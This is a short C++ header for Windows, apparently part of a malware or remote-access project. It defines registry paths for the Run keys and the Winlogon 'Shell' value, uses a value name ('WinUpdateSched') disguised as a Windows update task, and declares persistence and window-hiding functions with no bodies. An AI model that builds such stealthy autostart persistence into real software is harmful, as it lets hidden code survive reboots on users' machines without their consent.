#include                    <string>
#include                    <atlstr.h>
#include					<Windows.h>
#include					<wbemidl.h>
#include					<conio.h>
#include                    <winreg.h>
#include                    <winuser.h>
#include					<iostream>
#include                    <fstream>
#include                    <stdio.h>
#include                    <stdlib.h>


#define						KEY_TARGET						HKEY_LOCAL_MACHINE 
#define						KEY_NON_ADMIN_TARGET			HKEY_CURRENT_USER
#define						KEY_STARTUP						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define						KEY_NON_ADMIN_STARTUP			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define						KEY_ROOT_STARTUP				"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
#define						KEY_SHELL_NAME					"Shell"
#define						KEY_VALUE_NAME					"WinUpdateSched"

bool                        RegOnWin(char ** c_path);
void                        WinChange(bool show);
void                        SaveValueReg(const char *path, const char *key, const char *value);

void                        Persistence(std::string appName);
void                        RemovePersistence();


